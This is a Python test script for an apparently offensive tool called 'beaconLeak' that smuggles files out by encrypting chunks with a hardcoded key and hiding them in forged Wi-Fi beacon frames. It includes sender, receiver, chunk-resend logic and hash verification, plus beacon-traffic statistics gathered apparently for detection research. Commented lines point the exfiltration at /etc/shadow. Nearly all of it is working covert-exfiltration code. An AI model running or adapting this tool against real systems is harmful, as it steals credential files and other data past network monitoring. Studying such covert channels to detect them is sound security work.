#!/home/null/.pyenv/bin/python
#

import os
import sys
import time
from datetime import date
import subprocess

import nacl.utils
import nacl.secret
import nacl.hash

from scapy.all import Dot11
from scapy.all import Dot11Beacon
from scapy.all import Dot11Elt
from scapy.all import RadioTap
from scapy.all import sniff
from scapy.all import sendp
from scapy.all import srp1
from scapy.all import hexdump
from scapy.utils import PcapWriter

# globals
global box, t_frame, if0, b_stats, beacons, science

# interface
if0 = "wi7mon"

# test file
#t_file = "/etc/shadow"
t_file = "tests/distanceTestFile"

# test beacon
ssid = 'beaconLeak'
rates = b'\x82\x84\x0b\x16'
rsninfo = (
    b'\x01\x00'          # RSN Version 1
    b'\x00\x0f\xac\x04'  # Group Cipher Suite : 00-0f-ac CCMP
    b'\x01\x00'          # 1 Pairwise Cipher Suite
    b'\x00\x0f\xac\x04'  # AES Cipher CCMP
    b'\x01\x00'          # 1 Authentication Key Managment Suite:
    b'\x00\x0f\xac\x02'  # Pre-Shared Key
    b'\x0c\x00'          # RSN Capabilities
)
dot11 = Dot11(
    type=0,
    subtype=8,
    addr1='ff:ff:ff:ff:ff:ff',
    addr2='01:02:03:04:05:06',
    addr3='01:02:03:04:05:06'
)
beacon = Dot11Beacon(
    cap='ESS+privacy',
    #timestamp=int(time.time())
)
_ssid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
_rsninfo = Dot11Elt(ID='RSNinfo', info=rsninfo, len=len(rsninfo))
_rates = Dot11Elt(ID="Rates", info=rates, len=len(rates))
t_frame = RadioTap() / dot11 / beacon / _ssid / _rates / _rsninfo

# test crypto
psk = bytes.fromhex('299e29a4d36990bc479d6fed6551a94c7e3da6e10c8cdf9bab9e3c18a04ddee8')
box = nacl.secret.SecretBox(psk)

# stats
b_stats = []
science = {}
beacons = {}

# max size test
def size_test():
    global box, t_frame, if0
    for i in range(65535):
        try:
            m = box.encrypt(('A'*i).encode('ascii'))
            t_elt = Dot11Elt(ID=254, info=m, len=len(m))
            sendp(t_frame / t_elt, iface=if0, loop=0, inter=0.100, count=1, verbose=0)
            #input("Continue...")
        except Exception as e:
            print("[t] Fail at frame: {}, size: {}\n[e] {}".format(i, i*4, str(e)))
            #raise e
            return False
    print("[t] absolute unit!")
    return True

def size_test_breadth():
    global box, t_frame, if0
    for i in range(65535):
        try:
            m = box.encrypt(('A'*i).encode('ascii'))
            t_elt = Dot11Elt(ID=253, info=m, len=len(m))
            t_elt2 = Dot11Elt(ID=254, info=m, len=len(m))
            sendp(t_frame / t_elt / t_elt2, iface=if0, loop=0, inter=0.100, count=1, verbose=0)
            #input("Continue...")
        except Exception as e:
            print("[t] Fail at frame: {}, size: {}\n[e] {}".format(i, i*4, str(e)))
            #raise e
            return False
    print("[t] absolute unit!")
    return True

def live_stats(pkt):
    global b_stats
    b_stats.append(len(pkt))
    

def beacon_size_stats():
    global b_stats
    start = time.time()
    gmt = time.strftime('%d.%m.%Y %H:%M:%S', time.gmtime(start))
    print("\t[i] start time: {} GMT".format(gmt))
    pkts = sniff(iface=if0, 
        lfilter=lambda pkt: pkt.haslayer(Dot11Beacon), 
        prn=live_stats,
        timeout=(60*5)
    )
    end = time.time()
    print("\t[m] ended, seconds elapsed: {}".format(end - start))
    avg = sum(b_stats) / float(len(b_stats))
    print("[m] total beacons: {} (sanity check: {})".format(len(pkts), len(b_stats)))
    print("[m] average beacon size: {}".format(avg))

def do_science(pkt):
    global beacons
    try:
        beacons[pkt.addr2] += 1
    except KeyError as e:
        beacons[pkt.addr2] = 1
    

def beacon_histogram():
    import pprint, json
    global beacons, science
    channels = range(1,14)
    start = time.time()
    gmt = time.strftime('%d.%m.%Y %H:%M:%S', time.gmtime(start))
    f_prefix = time.strftime('%d.%m.%Y-%H:%M:%S', time.gmtime(start))
    print("[*] start time: {} GMT".format(gmt))
    # clear data
    beacons = {}
    for ch in channels:
        print("\t[i] channel: ", ch)
        subprocess.run("iw dev {} set channel {}".format(if0, ch), shell=True)
        pkts = sniff(iface=if0, 
            lfilter=lambda pkt: pkt.haslayer(Dot11Beacon), 
            prn=do_science,
            timeout=(60*1)
        )
        b_uniq = len(beacons.keys())
        b_total = sum(beacons.values())
        p_total = len(pkts)
        if p_total > 0:
            b_size_avg = sum([len(p) for p in pkts]) / float(p_total)
        science[ch] = {'b_uniq':b_uniq, 'b_size_avg':b_size_avg, 'b_total':b_total}
        print("\t[i] unique beacons: {}, size avg: {}, total beacons: {} (sanity:{})".format(b_uniq, b_size_avg, b_total, b_total==p_total))
        n_pcap = '{}-ch{}.pcap'.format(f_prefix, ch)
        f_pcap = PcapWriter(n_pcap)
        f_pcap.write(pkts)
        print("\t[i] wrote packets to: {}\n".format(n_pcap))
        #cleanup
        beacons = {}
        b_size_avg = 0
        f_pcap.close()
    print("[*] results:\n")
    pprint.pprint(science)
    f_report = '{}-science.json'.format(f_prefix) 
    f = open(f_report, 'w+')
    f.write(json.dumps(science))
    print("[*] results saved to file: {}".format(f_report))
    end = time.time()
    print("[*] end of experiment, duration: {} seconds".format(end - start))

##
# =============== here be dragons ===================
##
# chunk encrypt test (omg overhead)
import math
def stat_file(filename):
    max_size = 325
    f = open(filename, 'rb')
    file_size = f.seek(0, 2)
    print(f"\t[i] file size: {file_size} octets")
    approx = max_size - len(t_frame) - 84
    magic = math.ceil(math.log10(file_size / approx) + 1) # sacrifice to the god of statistics
    r_size = approx - magic
    chunks = math.ceil(file_size / r_size)
    print(f"\t[i] beacons needed to send file: {chunks}")
    f.close()
    return (file_size, chunks, r_size)

def stat_str(s):
    max_size = 325
    s_bytes = s.encode('utf-8')
    s_size = len(s_bytes)
    approx = max_size - len(t_frame) - 84
    magic = math.ceil(math.log10(s_size / approx) + 1) # sacrifice to the god of statistics
    r_size = approx - magic
    chunks = math.ceil(s_size / r_size)
    print(f"\t[i] beacons needed to send string: {chunks}")
    return (s_size, chunks, r_size)


def send_stat(filename):
    file_size, chunks, r_size = stat_file(filename)
    print("[*] Sending file stat frame...")
    payload = f"{file_size}:{chunks}".encode('ascii')
    payload_c = box.encrypt(payload)
    _payload = Dot11Elt(ID=222, info=payload_c, len=len(payload_c))
    tmp_frame = t_frame / _payload
    sendp(tmp_frame, iface=if0, verbose=0, realtime=True)

def send_file(filename):    
    print("[*] Sending data...")
    f = open(filename, 'rb')
    file_size, chunks, r_size = stat_file(filename)
    pos = 0
    start = time.time()
    for seq in range(chunks):           
        m_seq = str(seq)
        #print(f"\t[i] tag: {m_seq}")
        seq_c = box.encrypt(bytes(m_seq, 'ascii'))
        _seq = Dot11Elt(ID=253, info=seq_c, len=len(seq_c))
        #print(f"\t[i] tag size: {len(_seq)}")
        chunk = f.read(r_size) # crypto ovh + element ovh
        chunk_c = box.encrypt(chunk)
        _data = Dot11Elt(ID=254, info=chunk_c, len=len(chunk_c))
        #print(f"\t[i] encrypted data size: {len(chunk_c)}")
        _frame = t_frame / _seq / _data
        sendp(_frame, iface=if0, verbose=0, realtime=True)
        tell = f.tell()
        print(f"\t[i] sent frame {seq} of {chunks}, data[{pos}:{tell}], frame size: {len(_frame)}")
        pos = tell
        #input("[debug check]")
    end = time.time()
    print(f"[*] sent {chunks} in {end - start} seconds")
    band = (chunks * 325) / (end - start)
    print(f"[*] speed: {(band * 8) / 1000} kbps")
    print("[*] listening for chunk resend")
    sniff(iface=opt.iface, stop_filter=check_missing, monitor=True)
    print("[*] done!")


# niiice
def send_chunks(filename, chunk_list):
    file_size, chunks, r_size = stat_file(filename)
    with open(filename, 'rb') as f:    
        for seq in chunk_list:
            m_seq = str(seq)
            seq_c = box.encrypt(bytes(m_seq, 'ascii'))
            _seq = Dot11Elt(ID=253, info=seq_c, len=len(seq_c))
            chunk_offset = (r_size * seq)
            f.seek(chunk_offset)
            chunk = f.read(r_size)
            chunk_c = box.encrypt(chunk)
            _data = Dot11Elt(ID=254, info=chunk_c, len=len(chunk_c))
            _frame = t_frame / _seq / _data
            sendp(_frame, iface=if0, verbose=0, realtime=True)
            tell = f.tell()
            print(f"\t[i] resent frame {seq} of {chunks}, data[{chunk_offset}:{tell}], frame size: {len(_frame)}")


def check_missing(frame):
    if frame.addr2 == t_frame.addr2:
        if frame[Dot11Elt][6].ID == 223:
            print("[*] No more to resend!")
            return True
        elif frame[Dot11Elt][6].ID == 224:
            print("[*] chunk resend request found!")
            try:
                msg = box.decrypt(frame[Dot11Elt][6].info)
                filename = box.decrypt(frame[Dot11Elt][7].info)
                m_chunks = [int(x) for x in msg.split(b':')]
                send_chunks(filename, m_chunks)
                #return True
            except Exception as e:
                raise e
                print("[e] check_missing failure: " + str(e))



global recv
recv = dict(
    chunks = 0,
    size = 0,
    tally = None,
    tmp = None,
    done = False,
    tick = None,
    last = 3
)
def recv_file(frame):
    global recv
    chunks = recv['chunks']
    tally = recv['tally']
    tmp = recv['tmp']
    done = recv['done']
    if recv['tick'] and (time.time() - recv['tick']) > 1:
        print("[*] No response in one second")
        if tally and recv['last'] > 0:
            print(f"[*] partial file found, but no response, trying again {recv['last']}")
            recv['last'] = recv['last'] - 1
            recv_missing(tally)
            recv['tick'] = time.time()
        else:
            resp = t_frame / Dot11Elt(ID=223, info=b'\x00', len=1)
            sendp(resp, iface=opt.iface, verbose=0, monitor=True, count=3)
            tmp.close()
            return True
    if frame.addr2 == t_frame.addr2:
        #print(frame.command())
        # overhead beacon
        if frame[Dot11Elt][6].ID == 222:
            print("[!] Incoming File request found!")
            try:
                msg = box.decrypt(frame[Dot11Elt][6].info)
                s_msg = msg.split(b':')
                f_size = int(s_msg[0])
                chunks = int(s_msg[1])
                tally = [*range(chunks)]
                recv['tick'] = time.time()
                print(f"\t[i] file size: {f_size}, total chunks: {chunks}, tick: {recv['tick']}")
                tmp = open('/tmp/leak.part', 'w+')
                recv['chunks'] = chunks
                recv['tally'] = tally
                recv['tmp'] = tmp
            except Exception as e:
                print("[e] request not understood, ignoring")
                raise e
        # data beacon
        elif frame[Dot11Elt][6].ID == 253 and chunks > 0 and tmp:
            recv['tick'] = time.time()
            recv['last'] = 3
            try:
                ovh = box.decrypt(frame[Dot11Elt][6].info)
                ovh = int(ovh)
                data = frame[Dot11Elt][7].info
                print(f"\t[i] chunk {ovh} received")
                tally.remove(ovh)
                tmp.write(f"{ovh}:{data.hex()}\n")
                if ovh + 1 == chunks:
                    print("[i] last chunk received!")
                    if tally:
                        print(f"[!] missing chunks: {tally}")
                        recv_missing(tally)
                    else:
                        resp = t_frame / Dot11Elt(ID=223, info=b'\x00', len=1)
                        sendp(resp, iface=opt.iface, verbose=0, monitor=True)
                        tmp.close()
                        return True
                recv['tally'] = tally
                recv['done'] = done
            except ValueError as e:
                print("[!] received duplicate chunk " + str(e) )
            except Exception as e:
                print(f"[e] corrupted beacon! expected chunk {chunk + (chunk * -1)}")

    return done

def recv_missing(tally):
    msg = ":".join(str(x) for x in tally)
    msg_c = box.encrypt(msg.encode('utf-8'))
    fname = t_file
    fname_c = box.encrypt(t_file.encode('utf-8'))
    _data = Dot11Elt(ID=224, info=msg_c, len=len(msg_c))
    _fname = Dot11Elt(ID=225, info=fname_c, len=len(fname_c))
    sendp(t_frame / _data / _fname, iface=opt.iface)

def sort_trick(line):
    line_s = line.split(':')
    return int(line_s[0])

def decode_file():
    import hashlib
    orig = t_file
    saved = '/tmp/leak.part'
    print("[*] Calculating original file sha256 hash")
    h_orig = hashlib.sha256()
    with open(orig, 'rb') as f:
        h_orig.update(f.read())
    d_orig = h_orig.hexdigest()
    print(f"\t{d_orig}")
    print("[*] Decrypting and calculating saved file sha256 hash")
    h_saved = hashlib.sha256()
    with open(saved) as f:
        huge = f.readlines()
        huge.sort(key=sort_trick)
        test = open('/tmp/leaked', 'wb')
        for line in huge:    
            info = line.split(':')
            print(info[0], end=", ")
            chunk = box.decrypt(bytes.fromhex(info[1]))
            test.write(chunk)
            h_saved.update(chunk)
        test.close()
        print()
    d_saved = h_saved.hexdigest()
    print(f"\t{d_saved}")
    if d_orig == d_saved:
        print("[!] success!!")

# battery of tests
import argparse

args = argparse.ArgumentParser()
banner = """
     _                       __            _
    | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
    | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
    |___|___|__,|___|___|_|_|_____|___|__,|_,_|
                            by cjcase [test]\n
    """
print(banner)

args.add_argument("--recv", help="Receive mode test", action="store_true")
args.add_argument("--send", help="Send mode test", action="store_true")
args.add_argument("iface", help="monitor interface")

opt = args.parse_args()

#print("[*] size test")
#size_test()
#print("[*] size test breadth")
#size_test_breadth()
#print("[*] Surrounding beacon stats")
#beacon_size_stats()
#print("[*] Beacon Size IoC Experiment")
#beacon_histogram()
#print("[*] Stat file test")
#stat_file(t_file)
#print("[*] stat string test")
#stat_str(banner)


if0 = opt.iface

if opt.recv:
    print("[*] QoS receive file test")
    sniff(iface=opt.iface, stop_filter=recv_file, monitor=True)
    print("[*] File decode test")
    decode_file()
elif opt.send:
    #print("[*] Send file test")
    #send_file()
    #print("[*] waiting 5 seconds for receipt confirmation")
    #sniff(iface=if0, stop_filter=check_missing, monitor=True) """
    send_stat(t_file)
    send_file(t_file)
    #send_chunks("/etc/shadow", [1, 3, 5])


